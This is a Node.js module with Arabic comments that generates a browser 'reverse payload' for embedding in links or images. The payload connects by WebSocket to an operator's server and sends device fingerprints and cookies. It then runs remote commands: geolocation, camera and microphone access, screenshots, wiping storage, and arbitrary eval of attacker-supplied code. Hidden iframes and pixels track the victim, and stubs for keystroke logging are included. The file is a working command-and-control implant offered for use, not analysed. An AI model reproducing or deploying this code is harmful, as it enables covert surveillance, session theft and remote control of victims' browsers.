const { v4: uuidv4 } = require('uuid');

class AdvancedPayloadSystem {
    constructor() {
        this.payloads = new Map();
        this.sessions = new Map();
    }

    // إنشاء بايلود متقدم للروابط
    createAdvancedLinkPayload(linkId, serverUrl) {
        const payloadId = uuidv4();
        
        const advancedPayload = `
// === ADVANCED REVERSE PAYLOAD ===
(function() {
    const CONFIG = {
        link_id: '${linkId}',
        payload_id: '${payloadId}',
        server_url: '${serverUrl}',
        version: '7.0.0'
    };

    console.log('🦠 Advanced Reverse Payload Activated');

    // نظام التشغيل التلقائي
    function initializeSystem() {
        // الاتصال المباشر
        establishConnection();
        
        // المراقبة المستمرة
        startMonitoring();
        
        // العناصر المخفية
        createHiddenElements();
    }

    // إنشاء اتصال WebSocket
    function establishConnection() {
        try {
            const ws = new WebSocket(CONFIG.server_url.replace('https', 'wss'));
            
            ws.onopen = function() {
                console.log('✅ Connected to server');
                sendHandshake(ws);
            };
            
            ws.onmessage = function(event) {
                handleCommand(event);
            };
            
            ws.onclose = function() {
                console.log('🔄 Reconnecting...');
                setTimeout(establishConnection, 3000);
            };
            
            ws.onerror = function(error) {
                console.error('❌ WebSocket error:', error);
                setTimeout(establishConnection, 5000);
            };
            
        } catch (error) {
            console.error('❌ Connection error:', error);
            setTimeout(establishConnection, 5000);
        }
    }

    // إرسال معلومات المصافحة
    function sendHandshake(ws) {
        const deviceInfo = collectCompleteDeviceInfo();
        
        ws.send(JSON.stringify({
            type: 'reverse_connect',
            device_id: deviceInfo.device_id,
            link_id: CONFIG.link_id,
            payload_id: CONFIG.payload_id,
            platform: deviceInfo.platform,
            userAgent: deviceInfo.userAgent,
            url: deviceInfo.url,
            ip: deviceInfo.ip,
            device_info: deviceInfo,
            timestamp: new Date().toISOString()
        }));
    }

    // معالجة الأوامر الواردة
    function handleCommand(event) {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                executeAdvancedCommand(data.command, data.device_id)
                    .then(result => {
                        event.target.send(JSON.stringify({
                            type: 'command_result',
                            device_id: data.device_id,
                            command: data.command,
                            result: result
                        }));
                    });
            }
        } catch (e) {
            console.error('❌ Command error:', e);
        }
    }

    // جمع معلومات كاملة عن الجهاز
    function collectCompleteDeviceInfo() {
        return {
            device_id: generateDeviceId(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            screen: {
                width: window.screen?.width,
                height: window.screen?.height,
                colorDepth: window.screen?.colorDepth,
                orientation: window.screen?.orientation?.type
            },
            browser: getBrowserInfo(),
            network: getNetworkInfo(),
            device: getDeviceInfo(),
            location: window.location.href,
            referrer: document.referrer,
            cookies: document.cookie,
            localStorage: localStorage ? Object.keys(localStorage) : [],
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // نظام المراقبة المستمر
    function startMonitoring() {
        // مراقبة الموقع
        monitorLocation();
        
        // مراقبة البطارية
        monitorBattery();
        
        // مراقبة الشبكة
        monitorNetwork();
        
        // مراقبة النشاط
        monitorActivity();
    }

    // مراقبة الموقع
    function monitorLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                // يمكن إرسال الموقع للسيرفر
            }, null, { enableHighAccuracy: true });
        }
    }

    // مراقبة البطارية
    function monitorBattery() {
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                // يمكن إرسال حالة البطارية
            });
        }
    }

    // مراقبة الشبكة
    function monitorNetwork() {
        if (navigator.connection) {
            // يمكن إرسال معلومات الشبكة
        }
    }

    // مراقبة النشاط
    function monitorActivity() {
        document.addEventListener('click', (e) => {
            // تسجيل النقرات
        });

        document.addEventListener('keypress', (e) => {
            // تسجيل الضغطات
        });
    }

    // إنشاء عناصر مخفية
    function createHiddenElements() {
        // iframe مخفي للتتبع
        try {
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;';
            iframe.src = CONFIG.server_url + '/track/' + CONFIG.payload_id;
            document.body.appendChild(iframe);
        } catch(e) {}

        // صورة تتبع مخفية
        try {
            const img = new Image();
            img.src = CONFIG.server_url + '/pixel.png?payload=' + CONFIG.payload_id;
            img.style.display = 'none';
        } catch(e) {}
    }

    // تنفيذ الأوامر المتقدمة
    async function executeAdvancedCommand(command, deviceId) {
        try {
            let result = '';
            const cmd = command.toLowerCase().trim();
            
            // نظام الأوامر
            if (cmd === 'معلومات' || cmd === 'info') {
                result = await getCompleteSystemInfo();
            }
            else if (cmd === 'الموقع' || cmd === 'location') {
                result = await getPreciseLocation();
            }
            else if (cmd === 'اهتزاز' || cmd === 'vibrate') {
                result = await triggerVibration();
            }
            else if (cmd === 'البطارية' || cmd === 'battery') {
                result = await getBatteryStatus();
            }
            else if (cmd === 'الصور' || cmd === 'photos') {
                result = await extractAllImages();
            }
            else if (cmd === 'الكاميرا' || cmd === 'camera') {
                result = await accessCamera();
            }
            else if (cmd === 'الميكروفون' || cmd === 'microphone') {
                result = await accessMicrophone();
            }
            else if (cmd === 'التخزين' || cmd === 'storage') {
                result = await getStorageData();
            }
            else if (cmd === 'لقطة' || cmd === 'screenshot') {
                result = await takeScreenshot();
            }
            else if (cmd === 'فرمتة' || cmd === 'format') {
                result = await formatDevice();
            }
            else if (cmd.startsWith('js:')) {
                const jsCode = command.substring(3);
                result = String(await eval(jsCode));
            } else {
                result = String(await eval(command));
            }
            
            return result || '✅ تم التنفيذ بنجاح';
            
        } catch (error) {
            return '❌ خطأ في التنفيذ: ' + error.toString();
        }
    }

    // الحصول على معلومات النظام
    async function getCompleteSystemInfo() {
        const info = {
            device_id: generateDeviceId(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                color_depth: window.screen.colorDepth
            },
            browser: getBrowserInfo(),
            network: getNetworkInfo(),
            device: getDeviceInfo(),
            location: window.location.href,
            cookies: document.cookie,
            localStorage: localStorage ? Object.keys(localStorage) : [],
            battery: await getBatteryStatus(),
            timestamp: new Date().toISOString()
        };
        
        return JSON.stringify(info, null, 2);
    }

    // تحديد الموقع الدقيق
    function getPreciseLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('❌ المتصفح لا يدعم خدمة الموقع');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    const location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' متر',
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toLocaleString()
                    };
                    resolve(JSON.stringify(location, null, 2));
                },
                error => {
                    resolve('❌ خطأ في الموقع: ' + error.message);
                },
                { enableHighAccuracy: true, timeout: 30000 }
            );
        });
    }

    // تشغيل الاهتزاز
    function triggerVibration() {
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200, 100, 200]);
            return '📳 تم تشغيل الاهتزاز بنجاح';
        } else {
            return '❌ الجهاز لا يدعم الاهتزاز';
        }
    }

    // حالة البطارية
    function getBatteryStatus() {
        return new Promise((resolve) => {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    resolve(JSON.stringify({
                        level: (battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا',
                        charging_time: battery.chargingTime,
                        discharging_time: battery.dischargingTime
                    }, null, 2));
                }).catch(() => {
                    resolve('❌ لا يمكن قراءة معلومات البطارية');
                });
            } else {
                resolve('❌ المتصفح لا يدعم Battery API');
            }
        });
    }

    // استخراج الصور
    function extractAllImages() {
        try {
            const images = Array.from(document.images);
            const imageInfo = images.map((img, index) => ({
                index: index + 1,
                src: img.src,
                alt: img.alt || 'لا يوجد وصف',
                width: img.naturalWidth,
                height: img.naturalHeight
            }));
            
            return \`🖼️ تم العثور على \${images.length} صورة:\n\${JSON.stringify(imageInfo, null, 2)}\`;
        } catch (error) {
            return '❌ خطأ في استخراج الصور: ' + error.message;
        }
    }

    // الوصول للكاميرا
    function accessCamera() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                resolve('❌ لا يمكن الوصول إلى الكاميرا');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    resolve('✅ تم الوصول إلى الكاميرا بنجاح');
                })
                .catch(error => {
                    resolve('❌ خطأ في الكاميرا: ' + error.message);
                });
        });
    }

    // الوصول للميكروفون
    function accessMicrophone() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                resolve('❌ لا يمكن الوصول إلى الميكروفون');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    resolve('✅ تم الوصول إلى الميكروفون بنجاح');
                })
                .catch(error => {
                    resolve('❌ خطأ في الميكروفون: ' + error.message);
                });
        });
    }

    // بيانات التخزين
    function getStorageData() {
        try {
            return JSON.stringify({
                cookies: document.cookie,
                localStorage: localStorage ? Object.keys(localStorage) : [],
                sessionStorage: sessionStorage ? Object.keys(sessionStorage) : []
            }, null, 2);
        } catch (error) {
            return '❌ خطأ في قراءة التخزين';
        }
    }

    // لقطة الشاشة
    function takeScreenshot() {
        return new Promise((resolve) => {
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body).then(canvas => {
                    resolve(canvas.toDataURL('image/png').substring(0, 500) + '...');
                }).catch(() => {
                    resolve('❌ خطأ في أخذ لقطة الشاشة');
                });
            } else {
                resolve('❌ تتطلب لقطة الشاشة مكتبة html2canvas');
            }
        });
    }

    // محاكاة الفرمتة
    function formatDevice() {
        try {
            if (localStorage) localStorage.clear();
            if (sessionStorage) sessionStorage.clear();
            document.cookie.split(";").forEach(cookie => {
                const name = cookie.split("=")[0].trim();
                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });
            return '✅ تم محاكاة فرمتة البيانات المحلية بنجاح';
        } catch (error) {
            return '❌ خطأ في الفرمتة: ' + error.message;
        }
    }

    // وظائف مساعدة
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari")) return "Safari";
        if (ua.includes("Edge")) return "Edge";
        return "Unknown";
    }

    function getNetworkInfo() {
        if (navigator.connection) {
            return {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            };
        }
        return null;
    }

    function getDeviceInfo() {
        return {
            memory: navigator.deviceMemory,
            cores: navigator.hardwareConcurrency,
            touch: navigator.maxTouchPoints
        };
    }

    function generateDeviceId() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            Math.random().toString(36).substr(2, 9),
            Date.now().toString(36)
        ];
        return 'device_' + btoa(components.join('_')).replace(/[^a-zA-Z0-9]/g, '').substr(0, 20);
    }

    // بدء النظام
    console.log('🚀 Starting Advanced Reverse Payload System...');
    setTimeout(initializeSystem, 1000);

})();
// === ADVANCED PAYLOAD END ===
`;

        this.payloads.set(payloadId, {
            linkId: linkId,
            payload: advancedPayload,
            createdAt: new Date()
        });

        return {
            payloadId: payloadId,
            code: advancedPayload
        };
    }

    // إنشاء بايلود للصور
    createImagePayload(imageId, serverUrl) {
        return this.createAdvancedLinkPayload(imageId, serverUrl);
    }

    getPayload(payloadId) {
        return this.payloads.get(payloadId);
    }

    registerSession(deviceId, sessionData) {
        this.sessions.set(deviceId, {
            ...sessionData,
            lastActive: new Date(),
            active: true
        });
    }

    getActiveSessions() {
        return Array.from(this.sessions.entries())
            .filter(([_, session]) => session.active)
            .map(([deviceId, session]) => ({ deviceId, ...session }));
    }
}

module.exports = AdvancedPayloadSystem;